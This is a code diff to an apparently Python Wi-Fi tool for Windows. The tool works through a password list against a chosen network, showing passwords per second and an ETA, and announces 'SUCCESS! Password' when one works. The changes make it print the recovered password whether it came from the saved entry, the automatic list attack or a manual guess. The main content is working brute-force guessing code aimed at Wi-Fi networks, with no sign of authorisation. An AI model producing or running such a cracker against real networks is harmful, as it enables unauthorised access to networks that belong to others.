@@ -145,7 +145,7 @@ def quick_connection_check(ssid):
 def fast_connect_to_wifi(ssid, password):
     try:
         if not password:
-            return False
+            return False, None
             
         xml_content = f'''<?xml version="1.0"?>
 <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
@@ -184,11 +184,11 @@ def fast_connect_to_wifi(ssid, password):
             pass
         
         if connect_result.returncode == 0:
-            return quick_connection_check(ssid)
-        return False
+            return quick_connection_check(ssid), password
+        return False, None
             
     except:
-        return False
+        return False, None
 
 def ultra_fast_auto_connect(ssid, password_list):
     typing_animation(f"\n🚀 Ultra-Fast Auto-Connect to: {ssid}", Colors.PURPLE)
@@ -209,15 +209,16 @@ def ultra_fast_auto_connect(ssid, password_list):
             eta = remaining / speed if speed > 0 else 0
             typing_animation(f"🔍 {i:,}/{len(password_list):,} - {speed:.1f} pwd/sec - ETA: {eta:.1f}s", Colors.CYAN)
         
-        if fast_connect_to_wifi(ssid, password):
+        success, used_password = fast_connect_to_wifi(ssid, password)
+        if success:
             elapsed = time.time() - start_time
             typing_animation(f"\n" + "="*60, Colors.GREEN)
-            typing_animation(f"🎉 SUCCESS! Password: {password}", Colors.GREEN)
+            typing_animation(f"🎉 SUCCESS! Password: {used_password}", Colors.GREEN)
             typing_animation(f"📶 Connected to: {ssid}", Colors.GREEN)
             typing_animation(f"🌐 Internet: CONFIRMED", Colors.GREEN)
             typing_animation(f"⚡ Tested {i:,} passwords in {elapsed:.1f}s", Colors.GREEN)
             typing_animation("="*60, Colors.GREEN)
-            return True, password
+            return True, used_password
         
         if i % 100 == 0:
             time.sleep(0.5)
@@ -269,8 +270,9 @@ def main():
             
             if selected['has_password'] == "Yes":
                 typing_animation(f"🔑 Using saved password", Colors.YELLOW)
-                if fast_connect_to_wifi(selected['ssid'], selected['password']):
-                    typing_animation("✅ Connected!", Colors.GREEN)
+                success, used_password = fast_connect_to_wifi(selected['ssid'], selected['password'])
+                if success:
+                    typing_animation(f"✅ Connected! pass: {used_password}", Colors.GREEN)
                 else:
                     typing_animation("❌ Failed!", Colors.RED)
             else:
@@ -282,7 +284,7 @@ def main():
                     if passwords:
                         success, found_pass = ultra_fast_auto_connect(selected['ssid'], passwords)
                         if success:
-                            typing_animation(f"\n🎯 Password: {found_pass}", Colors.GREEN)
+                            typing_animation(f"✅ Connected! pass: {found_pass}", Colors.GREEN)
                         else:
                             typing_animation("❌ No working password found", Colors.RED)
                     else:
@@ -290,8 +292,9 @@ def main():
                 
                 elif mode in ['m', 'manual']:
                     password = input(Colors.WHITE + "Password: " + Colors.END)
-                    if fast_connect_to_wifi(selected['ssid'], password):
-                        typing_animation("✅ Connected!", Colors.GREEN)
+                    success, used_password = fast_connect_to_wifi(selected['ssid'], password)
+                    if success:
+                        typing_animation(f"✅ Connected! pass: {used_password}", Colors.GREEN)
                     else:
                         typing_animation("❌ Wrong password!", Colors.RED)
         else:
